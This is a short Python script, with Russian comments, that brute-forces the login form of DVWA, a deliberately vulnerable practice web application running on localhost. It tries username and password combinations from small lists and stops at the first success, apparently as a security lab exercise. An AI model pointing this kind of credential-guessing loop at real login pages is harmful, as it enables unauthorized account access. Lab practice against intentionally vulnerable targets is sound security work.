import requests
from itertools import product

# URL для перебора
url = 'http://localhost/DVWA/vulnerabilities/brute/' #'http://dvwa.local/login.php'

# Параметры формы логина
user_list = ['admin'] #, 'user'
password_list = ['password'] #'admin', , '<PASSWORD>', '<PASSWORD>'

def login(username, password):
    params = {'username': username, 'password': password}
    response = requests.get(url, params=params)
    
    if b'Login successful.' in response.content:
        print('Username: {}, Password: {}'.format(username, password))
        return True
    else:
        return False

# Перебираем все возможные комбинации
for username, password in product(user_list, password_list):
    result = login(username, password)
    if result:
        break
else:
    print("No valid combination found.")